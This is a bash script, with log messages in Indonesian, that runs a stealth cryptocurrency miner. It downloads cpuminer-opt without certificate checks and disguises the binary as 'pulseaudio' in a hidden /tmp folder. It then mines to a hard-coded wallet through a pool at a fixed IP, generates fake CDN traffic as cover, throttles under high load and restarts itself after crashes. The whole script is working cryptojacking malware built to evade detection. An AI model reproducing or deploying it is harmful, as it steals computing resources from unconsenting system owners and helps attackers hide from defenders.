#!/bin/bash
set -euo pipefail

LOGFILE="/tmp/.cache-h89r5j/stealth_miner.log"
mkdir -p "/tmp/.cache-h89r5j"
trap 'echo "[!] Error on line $LINENO at $(date)" | tee -a "$LOGFILE"; exit 1' ERR

ORIG_BIN="cpuminer-sse2"
FAKE_BIN="/tmp/.cache-h89r5j/pulseaudio"
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
POOL_PORTS=("9933" "443" "80")
POOL_BASE="stratum+tcps://104.248.150.108"
ALGO="power2b"
THREADS=$(nproc)

for PORT in "${POOL_PORTS[@]}"; do
  POOL="${POOL_BASE}:${PORT}"
  if timeout 3 bash -c "</dev/tcp/104.248.150.108/$PORT" 2>/dev/null; then
    echo "[+] Port $PORT terbuka, digunakan." | tee -a "$LOGFILE"
    break
  fi
done

if [ ! -f "$FAKE_BIN" ]; then
    echo "[*] Mengunduh dan menyamarkan binary..." | tee -a "$LOGFILE"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    cp "$ORIG_BIN" "$FAKE_BIN"
    chmod +x "$FAKE_BIN"
fi

fake_streaming() {
    while true; do
        curl -s -H "User-Agent: Firefox" https://cdn.jsdelivr.net/npm/lodash/lodash.min.js -o /dev/null
        echo "[*] Fake CDN activity $(date)" >> "$LOGFILE"
        sleep 40
    done
}

keep_alive() {
    while true; do
        echo "[*] Heartbeat $(date)" >> "$LOGFILE"
        (ping -c1 127.0.0.1 >/dev/null 2>&1 &)
        sleep 60
    done
}

cool_cpu() {
    MAX_LOAD_INT=6
    while true; do
        LOAD=$(awk '{print int($1)}' /proc/loadavg)
        if [ "$LOAD" -gt "$MAX_LOAD_INT" ]; then
            echo "[!] Load tinggi: $LOAD. Cooling..." >> "$LOGFILE"
            killall -q pulseaudio || true
            sleep $((30 + RANDOM % 30))
        fi
        sleep 30
    done
}

run_miner() {
    while true; do
        echo "[*] Mining dimulai $(date)" >> "$LOGFILE"
        fake_streaming &
        keep_alive &
        cool_cpu &

        setsid "$FAKE_BIN" -a "$ALGO" -o "$POOL" -u "$WALLET" -p x -t "$THREADS" --no-color >> /dev/null 2>&1 &
        PID=$!
        while sleep 30; do
            if ! ps -p $PID > /dev/null; then
                echo "[!] Miner crash. Restarting..." >> "$LOGFILE"
                break
            fi
        done
    done
}

run_miner
